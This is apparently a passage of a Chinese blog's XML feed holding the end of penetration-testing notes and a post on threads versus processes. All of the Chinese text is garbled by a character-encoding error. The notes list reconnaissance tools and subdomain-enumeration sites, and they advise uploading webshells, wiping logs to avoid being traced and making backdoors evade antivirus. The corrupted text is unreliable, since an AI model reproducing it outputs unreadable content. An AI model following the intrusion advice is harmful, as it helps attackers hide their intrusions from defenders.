contact(s).</span><br><span class="line"></span><br><span class="line">Web-based WHOIS:</span><br><span class="line">  https:&#x2F;&#x2F;domains.markmonitor.com&#x2F;whois</span><br><span class="line"></span><br><span class="line">If you have a legitimate interest in viewing the non-public WHOIS details, send</span><br><span class="line">your request and the reasons for your request to email@markmonitor.com</span><br><span class="line">and specify the domain name in the subject line. We will review that request and</span><br><span class="line">may ask for supporting documentation and explanation.</span><br><span class="line"></span><br><span class="line">The data in MarkMonitorâ€™s WHOIS database is provided for information purposes,</span><br><span class="line">and to assist persons in obtaining information about or related to a domain</span><br><span class="line">nameâ€™s registration record. While MarkMonitor believes the data to be accurate,</span><br><span class="line">the data is provided &quot;as is&quot; with no guarantee or warranties regarding its</span><br><span class="line">accuracy.</span><br><span class="line"></span><br><span class="line">By submitting a WHOIS query, you agree that you will use this data only for</span><br><span class="line">lawful purposes and that, under no circumstances will you use this data to:</span><br><span class="line">  (1) allow, enable, or otherwise support the transmission by email, telephone,</span><br><span class="line">or facsimile of mass, unsolicited, commercial advertising, or spam; or</span><br><span class="line">  (2) enable high volume, automated, or electronic processes that send queries,</span><br><span class="line">data, or email to MarkMonitor (or its systems) or the domain name contacts (or</span><br><span class="line">its systems).</span><br><span class="line"></span><br><span class="line">MarkMonitor.com reserves the right to modify these terms at any time.</span><br><span class="line"></span><br><span class="line">By submitting this query, you agree to abide by this policy.</span><br><span class="line"></span><br><span class="line">MarkMonitor is the Global Leader in Online Brand Protection.</span><br><span class="line"></span><br><span class="line">MarkMonitor Domain Management(TM)</span><br><span class="line">MarkMonitor Brand Protection(TM)</span><br><span class="line">MarkMonitor AntiCounterfeiting(TM)</span><br><span class="line">MarkMonitor AntiPiracy(TM)</span><br><span class="line">MarkMonitor AntiFraud(TM)</span><br><span class="line">Professional and Managed Services</span><br><span class="line"></span><br><span class="line">Visit MarkMonitor at https:&#x2F;&#x2F;www.markmonitor.com</span><br><span class="line">Contact us at +1.8007459229</span><br><span class="line">In Europe, at +44.02032062220</span><br></pre></td></tr></table></figure></div>

<p>ä¸€äº›åœ¨çº¿whoisæŸ¥è¯¢ç½‘ç«™ï¼š<br>çˆ±ç«™ï¼š<a href="http://old.whois.aizhan.com" target="_blank" rel="noopener">http://old.whois.aizhan.com</a><br>ç«™é•¿ä¹‹å®¶ï¼š<a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a><br>VirusTotal:<a href="https://www.virustotal.com/" target="_blank" rel="noopener">https://www.virustotal.com/</a></p>
<hr>
<h3 id="å¤‡æ¡ˆä¿¡æ¯æŸ¥è¯¢"><a href="#å¤‡æ¡ˆä¿¡æ¯æŸ¥è¯¢" class="headerlink" title="å¤‡æ¡ˆä¿¡æ¯æŸ¥è¯¢"></a>å¤‡æ¡ˆä¿¡æ¯æŸ¥è¯¢</h3><p>ICPå¤‡æ¡ˆæŸ¥è¯¢ç½‘ï¼š<a href="http://www.beianbeian.com/" target="_blank" rel="noopener">http://www.beianbeian.com/</a><br>å¤©çœ¼æŸ¥ï¼š<a href="https://www.tianyancha.com/" target="_blank" rel="noopener">https://www.tianyancha.com/</a></p>
<p>ä»ä¸»åŸŸåå‡ºå‘ï¼Œç„¶åéœ€è¦è€ƒè™‘çš„æ˜¯å­åŸŸåï¼Œæ¯”å¦‚<code>*.xxx.com</code> ï¼Œæ¥ä¸‹æ¥è¿›è¡Œå­åŸŸåæœé›†æ€è·¯çš„æ¢³ç†ã€‚</p>
<hr>
<h2 id="å­åŸŸåæ”¶é›†"><a href="#å­åŸŸåæ”¶é›†" class="headerlink" title="å­åŸŸåæ”¶é›†"></a>å­åŸŸåæ”¶é›†</h2><h3 id="A-æœç´¢å¼•æ“æŸ¥è¯¢"><a href="#A-æœç´¢å¼•æ“æŸ¥è¯¢" class="headerlink" title="A.æœç´¢å¼•æ“æŸ¥è¯¢"></a>A.æœç´¢å¼•æ“æŸ¥è¯¢</h3><p>Googleã€baiduã€Bingç­‰ä¼ ç»Ÿæœç´¢å¼•æ“<br>ä½¿ç”¨ google hacker è¯­æ³•<br>|å…³é”®å­—         |è¯´æ˜           |<br>|:â€”â€”â€”â€”-|:â€”â€”â€”â€”-|<br>|site|æŒ‡å®šåŸŸå|<br>|inurl|URLä¸­åŒ…å«æŒ‡å®šçš„å…³é”®å­—çš„ç½‘é¡µ|<br>|intext|æŒ‡å®šç½‘é¡µä¸­çš„å…³é”®å­—|<br>|filetype|æŒ‡å®šæ–‡ä»¶ç±»å‹|<br>|intitle|ç½‘é¡µæ ‡é¢˜ä¸­çš„å…³é”®å­—|<br>|link|è¿”å›åˆæŒ‡å®šURLåšäº†é“¾æ¥çš„URL|<br>|info|æŸ¥æ‰¾æŒ‡å®šç«™ç‚¹çš„åŸºæœ¬ä¿¡æ¯|<br>|cache|æœç´¢googleé‡Œå…³äºæŸäº›å†…å®¹çš„ç¼“å­˜|</p>
<p>ç½‘ç»œç©ºé—´å®‰å…¨æœç´¢å¼•æ“</p>
<p>zoomeye(é’Ÿé¦—ä¹‹çœ¼)ï¼š<a href="https://www.zoomeye.org" target="_blank" rel="noopener">https://www.zoomeye.org</a><br>shodanï¼š<a href="https://www.shodan.io" target="_blank" rel="noopener">https://www.shodan.io</a><br>Fofaï¼š<a href="https://fofa.so" target="_blank" rel="noopener">https://fofa.so</a> (æ¨èï¼‰<br>åŸŸåæŸ¥è¯¢ç½‘ï¼š<a href="https://site.ip138.com" target="_blank" rel="noopener">https://site.ip138.com</a> ï¼ˆæ¨èï¼‰<br>w3techsï¼š<a href="https://w3techs.com/sites" target="_blank" rel="noopener">https://w3techs.com/sites</a></p>
<p>PSï¼šä¹Ÿå¯ç¼–å†™Pythonè„šæœ¬æ‰¹é‡æŸ¥è¯¢ã€è·å–</p>
<hr>
<h3 id="B-åœ¨çº¿æŸ¥è¯¢æ¥å£"><a href="#B-åœ¨çº¿æŸ¥è¯¢æ¥å£" class="headerlink" title="B.åœ¨çº¿æŸ¥è¯¢æ¥å£"></a>B.åœ¨çº¿æŸ¥è¯¢æ¥å£</h3><p><a href="http://tool.chinaz.com/subdomain/" target="_blank" rel="noopener">http://tool.chinaz.com/subdomain/</a><br><a href="http://i.links.cn/subdomain/" target="_blank" rel="noopener">http://i.links.cn/subdomain/</a><br><a href="http://subdomain.chaxun.la/" target="_blank" rel="noopener">http://subdomain.chaxun.la/</a><br><a href="http://searchdns.netcraft.com/" target="_blank" rel="noopener">http://searchdns.netcraft.com/</a><br><a href="https://www.virustotal.com/" target="_blank" rel="noopener">https://www.virustotal.com/</a><br><a href="https://censys.io/" target="_blank" rel="noopener">https://censys.io/</a><br><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a> å¾®æ­¥åœ¨çº¿</p>
<hr>
<h3 id="C-å­åŸŸåæš´åŠ›çŒœè§£"><a href="#C-å­åŸŸåæš´åŠ›çŒœè§£" class="headerlink" title="C.å­åŸŸåæš´åŠ›çŒœè§£"></a>C.å­åŸŸåæš´åŠ›çŒœè§£</h3><p>çˆ†ç ´å·¥å…·ï¼š<br>Layerå­åŸŸåæŒ–æ˜æœº<br>wydomainï¼š<a href="https://github.com/ring04h/wydomain" target="_blank" rel="noopener">https://github.com/ring04h/wydomain</a><br>subDomainsBrute:<a href="https://github.com/lijiejie/" target="_blank" rel="noopener">https://github.com/lijiejie/</a><br>Sublist3r:<a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/Sublist3r</a><br>å¾¡å‰‘åå°æ‰«æ<br>æ˜å°å­æ³¨å…¥</p>
<hr>
<h3 id="D-DNSæŸ¥è¯¢-æšä¸¾"><a href="#D-DNSæŸ¥è¯¢-æšä¸¾" class="headerlink" title="D.DNSæŸ¥è¯¢/æšä¸¾"></a>D.DNSæŸ¥è¯¢/æšä¸¾</h3><p>DNSæŸ¥è¯¢ï¼š<br>host -t a domainName<br>host -t mx domainName</p>
<p>ä¼˜ç‚¹ï¼šéå¸¸ç›´è§‚ï¼Œé€šè¿‡æŸ¥è¯¢DNSæœåŠ¡å™¨çš„Aè®°å½•ã€CNAMEç­‰ï¼Œå¯ä»¥å‡†ç¡®å¾—åˆ°ç›¸å…³ä¿¡æ¯ï¼Œè¾ƒå…¨ã€‚<br>ç¼ºç‚¹ï¼šæœ‰å¾ˆå¤§çš„å±€é™æ€§ï¼Œå¾ˆå¤šDNSæ˜¯ç¦æ­¢æŸ¥è¯¢çš„ã€‚<br>å‚è€ƒï¼š<a href="https://www.cnblogs.com/xuanhun/p/3489038.html" target="_blank" rel="noopener">https://www.cnblogs.com/xuanhun/p/3489038.html</a></p>
<p>åŸŸä¼ é€æ¼æ´</p>
<p>DNSæš´åŠ›ç ´è§£ï¼šfierce<br>å‚è€ƒé“¾æ¥ï¼š<a href="http://blog.csdn.net/jeanphorn/article/details/44987549" target="_blank" rel="noopener">http://blog.csdn.net/jeanphorn/article/details/44987549</a></p>
<p>Passive DNS<br>å‚è€ƒé“¾æ¥ï¼š<a href="http://www.freebuf.com/articles/network/103815.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/network/103815.html</a></p>
<hr>
<h3 id="E-HTTPSè¯ä¹¦"><a href="#E-HTTPSè¯ä¹¦" class="headerlink" title="E.HTTPSè¯ä¹¦"></a>E.HTTPSè¯ä¹¦</h3><p>è¯ä¹¦é¢å‘æœºæ„(CA)å¿…é¡»å°†ä»–ä»¬å‘å¸ƒçš„æ¯ä¸ªSSL/TLSè¯ä¹¦å‘å¸ƒåˆ°å…¬å…±æ—¥å¿—ä¸­ã€‚SSL/TLSè¯ä¹¦é€šå¸¸åŒ…å«åŸŸåã€å­åŸŸåå’Œç”µå­é‚®ä»¶åœ°å€ã€‚å› æ­¤SSL/TLSè¯ä¹¦æˆä¸ºäº†æ”»å‡»è€…çš„åˆ‡å…¥ç‚¹ã€‚</p>
<p>SSLè¯ä¹¦æœç´¢å¼•æ“ï¼š<br><a href="https://certdb.com/domain/github.com" target="_blank" rel="noopener">https://certdb.com/domain/github.com</a><br><a href="https://crt.sh/?Identity=%%.github.com" target="_blank" rel="noopener">https://crt.sh/?Identity=%%.github.com</a><br><a href="https://censys.io/" target="_blank" rel="noopener">https://censys.io/</a></p>
<p>åŸºäº HTTPS è¯ä¹¦çš„å­åŸŸåæ”¶é›†å°ç¨‹åº ï¼šGetDomainsBySSL.py<br>å‚è€ƒé“¾æ¥ï¼š<a href="http://www.freebuf.com/articles/network/140738.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/network/140738.html</a></p>
<hr>
<h3 id="F-ç»¼åˆæœç´¢"><a href="#F-ç»¼åˆæœç´¢" class="headerlink" title="F.ç»¼åˆæœç´¢"></a>F.ç»¼åˆæœç´¢</h3><p>æè«ï¼š<a href="https://github.com/bit4woo/teemo" target="_blank" rel="noopener">https://github.com/bit4woo/teemo</a><br>ä¸»è¦æœ‰ä¸‰å¤§æ¨¡å—ï¼šæœç´¢å¼•æ“ ç¬¬ä¸‰æ–¹ç«™ç‚¹ æšä¸¾ </p>
<p>åˆ©ç”¨å…¨ç½‘IPæ‰«æhttpç«¯å£ åœ¨è®¿é—®IPçš„80æˆ–è€…8080ç«¯å£çš„æ—¶å€™ï¼Œå¯èƒ½ä¼šé‡åˆ°é…ç½®äº†301è·³è½¬çš„ï¼Œå¯ä»¥åœ¨headeré‡Œè·å–åŸŸåä¿¡æ¯ã€‚<br>å…¨ç½‘æ‰«æç»“æœå¦‚ä¸‹ï¼š<a href="https://scans.io/study/sonar.http" target="_blank" rel="noopener">https://scans.io/study/sonar.http</a></p>
<p>ç„¶åé™„ä¸Šæ€ç»´å¯¼å›¾<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g6wz56umvsj31860njgo2.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g6wz56umvsj31860njgo2.jpg" class="lazyload" title="test"></a></p>
<hr>
<h1 id="æ¼æ´æŒ–æ˜"><a href="#æ¼æ´æŒ–æ˜" class="headerlink" title="æ¼æ´æŒ–æ˜"></a>æ¼æ´æŒ–æ˜</h1><p>å­¦ä¼šä½¿ç”¨å„ç§æŠ€èƒ½å»è¿›è¡Œæ¼æ´æŒ–æ˜<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g6wz56x3mdj31c60u0n2u.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g6wz56x3mdj31c60u0n2u.jpg" class="lazyload" title="test"></a></p>
<hr>
<h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>ä»ä¸åŒæ–¹å¼å¯»æ‰¾POCï¼Œå­¦ä¼šæŸ¥çœ‹ä¸­é—´ä»¶ï¼Œåˆ©ç”¨å·¥å…·ï¼Œæˆ–è€…è‡ªå·±ç¼–å†™æ”»å‡»è„šæœ¬<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g6wz56tjsuj30xn0k1wge.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g6wz56tjsuj30xn0k1wge.jpg" class="lazyload" title="test"></a></p>
<hr>
<h1 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h1><p>è¿›å…¥åå°åï¼Œä¸Šä¼ webshell å´æ‰§è¡Œä¸äº†ï¼Œå°±è¦æƒ³åŠæ³•ææƒ<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g6wz56tbilj31ez0lkn0e.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g6wz56tbilj31ez0lkn0e.jpg" class="lazyload" title="test"></a></p>
<hr>
<h1 id="æ—¥å¿—æ¸…ç†"><a href="#æ—¥å¿—æ¸…ç†" class="headerlink" title="æ—¥å¿—æ¸…ç†"></a>æ—¥å¿—æ¸…ç†</h1><p>ç„¶åè¦æ³¨æ„æ“¦å‡ºç—•è¿¹ï¼Œé˜²æ­¢æ°´è¡¨<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g6wz56s22nj30tp0eiq3x.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g6wz56s22nj30tp0eiq3x.jpg" class="lazyload" title="test"></a></p>
<hr>
<h1 id="åé—¨"><a href="#åé—¨" class="headerlink" title="åé—¨"></a>åé—¨</h1><p>åˆ©ç”¨åé—¨çš„æ—¶å€™ï¼Œä¹Ÿè¦å­¦ä¼šå…æ€ï¼Œå’Œæ“¦ç—•è¿¹<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g6wz56smryj30q30e9js3.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g6wz56smryj30q30e9js3.jpg" class="lazyload" title="test"></a></p>
<hr>
<h1 id="åè¯"><a href="#åè¯" class="headerlink" title="åè¯"></a>åè¯</h1><p>å‡†å¤‡å¤šèŠ±æ—¶é—´åº·åº·æ–°çš„CVEï¼Œè‡ªå·±æœ€è¿‘è¿˜æœ‰å‡ ä¸ªCMSè¦çœ‹ï¼Œè¿™å‘¨å†èŠ±ç‚¹æ—¶é—´æ¥çœ‹ä¸€ä¸‹CVE-2019-0708ï¼Œç„¶åæ›´ä¸€ç¯‡å§ã€‚</p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>çæ‰¯</tag>
        <tag>æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>çº¿ç¨‹å’Œè¿›ç¨‹çš„åŒºåˆ«ï¼ˆå­¦ä¹ ï¼‰</title>
    <url>/yakko117/2019/07/25/%E7%BA%BF%E7%A8%8B%E4%B8%8E%E8%BF%9B%E7%A8%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="çº¿ç¨‹å’Œè¿›ç¨‹çš„åŒºåˆ«"><a href="#çº¿ç¨‹å’Œè¿›ç¨‹çš„åŒºåˆ«" class="headerlink" title="çº¿ç¨‹å’Œè¿›ç¨‹çš„åŒºåˆ«"></a>çº¿ç¨‹å’Œè¿›ç¨‹çš„åŒºåˆ«</h1><h2 id="1ã€è¿›ç¨‹æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#1ã€è¿›ç¨‹æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="1ã€è¿›ç¨‹æ˜¯ä»€ä¹ˆï¼Ÿ"></a>1ã€è¿›ç¨‹æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>æ˜¯å…·æœ‰ä¸€å®šç‹¬ç«‹åŠŸèƒ½çš„ç¨‹åºã€å®ƒæ˜¯ç³»ç»Ÿè¿›è¡Œèµ„æºåˆ†é…å’Œè°ƒåº¦çš„ä¸€ä¸ªç‹¬ç«‹å•ä½ï¼Œé‡ç‚¹åœ¨ç³»ç»Ÿè°ƒåº¦å’Œå•ç‹¬çš„å•ä½ï¼Œä¹Ÿå°±æ˜¯è¯´è¿›ç¨‹æ˜¯å¯ä»¥ç‹¬ç«‹è¿è¡Œçš„ä¸€æ®µç¨‹åºã€‚    </p>
<h2 id="2ã€çº¿ç¨‹åˆæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#2ã€çº¿ç¨‹åˆæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="2ã€çº¿ç¨‹åˆæ˜¯ä»€ä¹ˆï¼Ÿ"></a>2ã€çº¿ç¨‹åˆæ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>çº¿ç¨‹è¿›ç¨‹çš„ä¸€ä¸ªå®ä½“ï¼Œæ˜¯CPUè°ƒåº¦å’Œåˆ†æ´¾çš„åŸºæœ¬å•ä½ï¼Œä»–æ˜¯æ¯”è¿›ç¨‹æ›´å°çš„èƒ½ç‹¬ç«‹è¿è¡Œçš„åŸºæœ¬å•ä½ï¼Œçº¿ç¨‹è‡ªå·±åŸºæœ¬ä¸Šä¸æ‹¥æœ‰ç³»ç»Ÿèµ„æºã€‚åœ¨è¿è¡Œæ—¶ï¼Œåªæ˜¯æš‚ç”¨ä¸€äº›è®¡æ•°å™¨ã€å¯„å­˜å™¨å’Œæ ˆ ã€‚</p>
<ul>
<li>è¿›ç¨‹(ç¨‹åº)ï¼šæ˜¯é™æ€æ¦‚å¿µï¼Œä¸€ä¸ªclassæ–‡ä»¶ã€ä¸€ä¸ªexeæ–‡ä»¶</li>
<li>çº¿ç¨‹ï¼šæ˜¯ä¸€ä¸ªç¨‹åºé‡Œé¢ä¸åŒçš„æ‰§è¡Œè·¯å¾„</li>
<li><a href="https://www.cnblogs.com/zhehan54/p/6130030.html" target="_blank" rel="noopener">å‚è€ƒCSDN</a></li>
</ul>
<hr>
<h2 id="å®ƒä»¬ä¹‹é—´çš„å…³ç³»"><a href="#å®ƒä»¬ä¹‹é—´çš„å…³ç³»" class="headerlink" title="å®ƒä»¬ä¹‹é—´çš„å…³ç³»"></a>å®ƒä»¬ä¹‹é—´çš„å…³ç³»</h2><ul>
<li>1ã€ä¸€ä¸ªçº¿ç¨‹åªèƒ½å±äºä¸€ä¸ªè¿›ç¨‹ï¼Œè€Œä¸€ä¸ªè¿›ç¨‹å¯ä»¥æœ‰å¤šä¸ªçº¿ç¨‹ï¼Œä½†è‡³å°‘æœ‰ä¸€ä¸ªçº¿ç¨‹ï¼ˆé€šå¸¸è¯´çš„ä¸»çº¿ç¨‹ï¼‰ã€‚</li>
<li>2ã€èµ„æºåˆ†é…ç»™è¿›ç¨‹ï¼ŒåŒä¸€è¿›ç¨‹çš„æ‰€æœ‰çº¿ç¨‹å…±äº«è¯¥è¿›ç¨‹çš„æ‰€æœ‰èµ„æºã€‚</li>
<li>3ã€çº¿ç¨‹åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œéœ€è¦åä½œåŒæ­¥ã€‚ä¸åŒè¿›ç¨‹çš„çº¿ç¨‹é—´è¦åˆ©ç”¨æ¶ˆæ¯é€šä¿¡çš„åŠæ³•å®ç°åŒæ­¥ã€‚   </li>
<li>4ã€å¤„ç†æœºåˆ†ç»™çº¿ç¨‹ï¼Œå³çœŸæ­£åœ¨å¤„ç†æœºä¸Šè¿è¡Œçš„æ˜¯çº¿ç¨‹ã€‚   </li>
<li>5ã€çº¿ç¨‹æ˜¯æŒ‡è¿›ç¨‹å†…çš„ä¸€ä¸ªæ‰§è¡Œå•å…ƒï¼Œä¹Ÿæ˜¯è¿›ç¨‹å†…çš„å¯è°ƒåº¦å®ä½“ã€‚</li>
</ul>
<hr>
<h1 id="è¿›ç¨‹ä¸çº¿ç¨‹çš„èµ„æº"><a href="#è¿›ç¨‹ä¸çº¿ç¨‹çš„èµ„æº" class="headerlink" title="è¿›ç¨‹ä¸çº¿ç¨‹çš„èµ„æº"></a>è¿›ç¨‹ä¸çº¿ç¨‹çš„èµ„æº</h1><h2 id="å †ä¸æ ˆ"><a href="#å †ä¸æ ˆ" class="headerlink" title="å †ä¸æ ˆ"></a>å †ä¸æ ˆ</h2><ol>
<li><p>å †æ˜¯å¤§å®¶å…±æœ‰çš„ç©ºé—´ï¼Œåˆ†å…¨å±€å †å’Œå±€éƒ¨å †ã€‚å…¨å±€å †å°±æ˜¯æ‰€æœ‰æ²¡æœ‰åˆ†é…çš„ç©ºé—´ï¼Œå±€éƒ¨å †å°±æ˜¯ç”¨æˆ·åˆ†é…çš„ç©ºé—´ã€‚å †åœ¨æ“ä½œç³»ç»Ÿå¯¹è¿›ç¨‹åˆå§‹åŒ–çš„æ—¶å€™åˆ†é…ï¼Œè¿è¡Œè¿‡ç¨‹ä¸­ä¹Ÿå¯ä»¥å‘ç³»ç»Ÿè¦é¢å¤–çš„å †ï¼Œä½†æ˜¯è®°å¾—ç”¨å®Œäº†è¦è¿˜ç»™æ“ä½œç³»ç»Ÿï¼Œè¦ä¸ç„¶å°±æ˜¯å†…å­˜æ³„æ¼ã€‚</p>
</li>
<li><p>æ ˆæ˜¯ä¸ªçº¿ç¨‹ç‹¬æœ‰çš„ï¼Œä¿å­˜å…¶è¿è¡ŒçŠ¶æ€å’Œå±€éƒ¨è‡ªåŠ¨å˜é‡çš„ã€‚æ ˆåœ¨çº¿ç¨‹å¼€å§‹çš„æ—¶å€™åˆå§‹åŒ–ï¼Œæ¯ä¸ªçº¿ç¨‹çš„æ ˆäº’ç›¸ç‹¬ç«‹ï¼Œå› æ­¤ï¼Œæ ˆæ˜¯ <code>thread safe</code>çš„ã€‚æ“ä½œç³»ç»Ÿåœ¨åˆ‡æ¢çº¿ç¨‹çš„æ—¶å€™ä¼šè‡ªåŠ¨çš„åˆ‡æ¢æ ˆï¼Œå°±æ˜¯åˆ‡æ¢ <code>ï¼³ï¼³ï¼ï¼¥ï¼³ï¼°</code>å¯„å­˜å™¨ã€‚æ ˆç©ºé—´ä¸éœ€è¦åœ¨é«˜çº§è¯­è¨€é‡Œé¢æ˜¾å¼çš„åˆ†é…å’Œé‡Šæ”¾ã€‚</p>
</li>
</ol>
<hr>
<h2 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h2><p>çº¿ç¨‹å…±äº«çš„ç¯å¢ƒåŒ…æ‹¬ï¼šè¿›ç¨‹ä»£ç æ®µã€è¿›ç¨‹çš„å…¬æœ‰æ•°æ®(åˆ©ç”¨è¿™äº›å…±äº«çš„æ•°æ®ï¼Œçº¿ç¨‹å¾ˆå®¹æ˜“çš„å®ç°ç›¸äº’ä¹‹é—´çš„é€šè®¯)ã€è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦ã€ä¿¡å·çš„å¤„ç†å™¨ã€è¿›ç¨‹çš„å½“å‰ç›®å½•å’Œè¿›ç¨‹ç”¨æˆ·IDä¸è¿›ç¨‹ç»„IDã€‚<br>è¿›ç¨‹æ‹¥æœ‰è¿™è®¸å¤šå…±æ€§çš„åŒæ—¶ï¼Œè¿˜æ‹¥æœ‰è‡ªå·±çš„ä¸ªæ€§ã€‚æœ‰äº†è¿™äº›ä¸ªæ€§ï¼Œçº¿ç¨‹æ‰èƒ½å®ç°å¹¶å‘æ€§ã€‚è¿™äº›ä¸ªæ€§åŒ…æ‹¬ï¼š</p>
<h3 id="1-çº¿ç¨‹ID"><a href="#1-çº¿ç¨‹ID" class="headerlink" title="1.çº¿ç¨‹ID"></a>1.çº¿ç¨‹ID</h3><p>æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„çº¿ç¨‹IDï¼Œè¿™ä¸ªIDåœ¨æœ¬è¿›ç¨‹ä¸­æ˜¯å”¯ä¸€çš„ã€‚<br>è¿›ç¨‹ç”¨æ­¤æ¥æ ‡è¯†çº¿ç¨‹ã€‚</p>
<hr>
<h3 id="2-å¯„å­˜å™¨ç»„çš„å€¼"><a href="#2-å¯„å­˜å™¨ç»„çš„å€¼" class="headerlink" title="2.å¯„å­˜å™¨ç»„çš„å€¼"></a>2.å¯„å­˜å™¨ç»„çš„å€¼</h3><p>ç”±äºçº¿ç¨‹é—´æ˜¯å¹¶å‘è¿è¡Œçš„ï¼Œæ¯ä¸ªçº¿ç¨‹æœ‰è‡ªå·±ä¸åŒçš„è¿è¡Œçº¿ç´¢ï¼Œ<br>å½“ä»ä¸€ä¸ªçº¿ç¨‹åˆ‡æ¢åˆ°å¦ä¸€ä¸ªçº¿ç¨‹ä¸Šæ—¶ï¼Œå¿…é¡»å°†åŸæœ‰çš„çº¿ç¨‹çš„å¯„å­˜å™¨é›†åˆçš„çŠ¶æ€ä¿å­˜ï¼Œ<br>ä»¥ä¾¿å°†æ¥è¯¥çº¿ç¨‹åœ¨è¢«é‡æ–°åˆ‡æ¢åˆ°æ—¶èƒ½å¾—ä»¥æ¢å¤ã€‚</p>
<hr>
<h3 id="3-çº¿ç¨‹çš„å †æ ˆ"><a href="#3-çº¿ç¨‹çš„å †æ ˆ" class="headerlink" title="3.çº¿ç¨‹çš„å †æ ˆ"></a>3.çº¿ç¨‹çš„å †æ ˆ</h3><p>å †æ ˆæ˜¯ä¿è¯çº¿ç¨‹ç‹¬ç«‹è¿è¡Œæ‰€å¿…é¡»çš„ã€‚<br>çº¿ç¨‹å‡½æ•°å¯ä»¥è°ƒç”¨å‡½æ•°ï¼Œè€Œè¢«è°ƒç”¨å‡½æ•°ä¸­åˆæ˜¯å¯ä»¥å±‚å±‚åµŒå¥—çš„ï¼Œ<br>æ‰€ä»¥çº¿ç¨‹å¿…é¡»æ‹¥æœ‰è‡ªå·±çš„å‡½æ•°å †æ ˆï¼Œä½¿å¾—å‡½æ•°è°ƒç”¨å¯ä»¥æ­£å¸¸æ‰§è¡Œï¼Œ<br>ä¸å—å…¶ä»–çº¿ç¨‹çš„å½±å“ã€‚</p>
<hr>
<h3 id="4-é”™è¯¯è¿”å›ç "><a href="#4-é”™è¯¯è¿”å›ç " class="headerlink" title="4.é”™è¯¯è¿”å›ç "></a>4.é”™è¯¯è¿”å›ç </h3><p>ç”±äºåŒä¸€ä¸ªè¿›ç¨‹ä¸­æœ‰å¾ˆå¤šä¸ªçº¿ç¨‹åœ¨åŒæ—¶è¿è¡Œï¼Œå¯èƒ½æŸä¸ªçº¿ç¨‹è¿›è¡Œç³»ç»Ÿè°ƒç”¨<br>åè®¾ç½®äº†errnoå€¼ï¼Œè€Œåœ¨è¯¥çº¿ç¨‹è¿˜æ²¡æœ‰å¤„ç†è¿™ä¸ªé”™è¯¯ï¼Œå¦å¤–ä¸€ä¸ªçº¿ç¨‹å°±åœ¨æ­¤æ—¶<br>è¢«è°ƒåº¦å™¨æŠ•å…¥è¿è¡Œï¼Œè¿™æ ·é”™è¯¯å€¼å°±æœ‰å¯èƒ½è¢«ä¿®æ”¹ã€‚<br>æ‰€ä»¥ï¼Œä¸åŒçš„çº¿ç¨‹åº”è¯¥æ‹¥æœ‰è‡ªå·±çš„é”™è¯¯è¿”å›ç å˜é‡ã€‚</p>
<hr>
<h3 id="5-çº¿ç¨‹çš„ä¿¡å·å±è”½ç "><a href="#5-çº¿ç¨‹çš„ä¿¡å·å±è”½ç " class="headerlink" title="5.çº¿ç¨‹çš„ä¿¡å·å±è”½ç "></a>5.çº¿ç¨‹çš„ä¿¡å·å±è”½ç </h3><p>ç”±äºæ¯ä¸ªçº¿ç¨‹æ‰€æ„Ÿå…´è¶£çš„ä¿¡å·ä¸åŒï¼Œ<br>æ‰€ä»¥çº¿ç¨‹çš„ä¿¡å·å±è”½ç åº”è¯¥ç”±çº¿ç¨‹è‡ªå·±ç®¡ç†ã€‚<br>ä½†æ‰€æœ‰çš„çº¿ç¨‹éƒ½å…±äº«åŒæ ·çš„ä¿¡å·å¤„ç†å™¨ã€‚</p>
<hr>
